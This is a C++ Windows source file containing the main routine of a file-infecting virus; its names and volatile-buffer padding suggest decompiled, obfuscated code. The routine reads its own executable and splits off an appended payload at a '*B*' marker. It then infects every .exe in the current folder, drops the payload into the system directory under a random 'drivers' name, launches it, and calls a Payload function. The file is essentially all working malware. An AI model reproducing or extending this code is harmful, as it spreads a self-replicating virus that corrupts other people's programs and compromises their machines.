#include "data_globals.h"
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <shellapi.h>
#include <cstring>
#pragma optimize("", off)

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    volatile HMODULE hModule_buf[2] = {GetModuleHandleA(nullptr), (HMODULE)0};
    volatile HMODULE *p_hModule = (volatile HMODULE *)&hModule_buf[0];
    GetModuleFileNameA(*const_cast<HMODULE*>(p_hModule), Virus, 0x104);
    Secret(Virus);

    inf = 0x2a;
    DAT_140008165 = 0x42;
    DAT_140008166 = 0x2a;

    std::ifstream inFile(reinterpret_cast<const char*>(Virus), std::ios::in | std::ios::binary);
    inFile.seekg(0, std::ios::end);
    std::streampos pos = inFile.tellg();
    volatile int fileSize_buf[2] = {static_cast<int>(pos), (int)0};
    volatile int *p_fileSize = (volatile int *)&fileSize_buf[0];
    inFile.seekg(0, std::ios::beg);

    // VBuffer is char* – cast malloc result
    VBuffer = static_cast<char*>(malloc(static_cast<size_t>(*p_fileSize)));
    inFile.read(static_cast<char*>(VBuffer), *p_fileSize);
    inFile.close();

    volatile int markerPos_buf[2] = {-1, (int)0};
    volatile int *p_markerPos = (volatile int *)&markerPos_buf[0];
    volatile int i_buf[2] = {0, (int)0};
    volatile int *p_i = (volatile int *)&i_buf[0];
    for (*p_i = 0; *p_i < *p_fileSize; (*p_i)++) {
        if (VBuffer[*p_i] == '*' && VBuffer[*p_i + 1] == 'B' && VBuffer[*p_i + 2] == '*') {
            *p_markerPos = *p_i;
            FBuffer = static_cast<char*>(VBuffer) + *p_i + 3;
            break;
        }
    }

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("*.exe", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            Infect(findData.cFileName, static_cast<char*>(VBuffer));
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    time_t t = time(nullptr);
    srand(static_cast<unsigned int>(t));
    volatile int randNum_buf[2] = {rand(), (int)0};
    volatile int *p_randNum = (volatile int *)&randNum_buf[0];
    char randStr[16];
    sprintf_s(randStr, sizeof(randStr), "%d", *p_randNum);

    CHAR systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    strcat(systemPath, "\\drivers");
    strcat(systemPath, randStr);
    strcat(systemPath, ".exe");

    if (FBuffer != nullptr) {
        std::ofstream outFile(systemPath, std::ios::out | std::ios::binary);
        if (*p_markerPos != -1) {
            volatile int payloadSize_buf[2] = {*p_fileSize - (*p_markerPos + 3), (int)0};
            volatile int *p_payloadSize = (volatile int *)&payloadSize_buf[0];
            outFile.write(static_cast<const char*>(FBuffer), *p_payloadSize);
        }
        outFile.close();
        ShellExecuteA(nullptr, nullptr, systemPath, nullptr, nullptr, 5);
    }

    Payload();
    return 0;
}
#pragma optimize("", on)
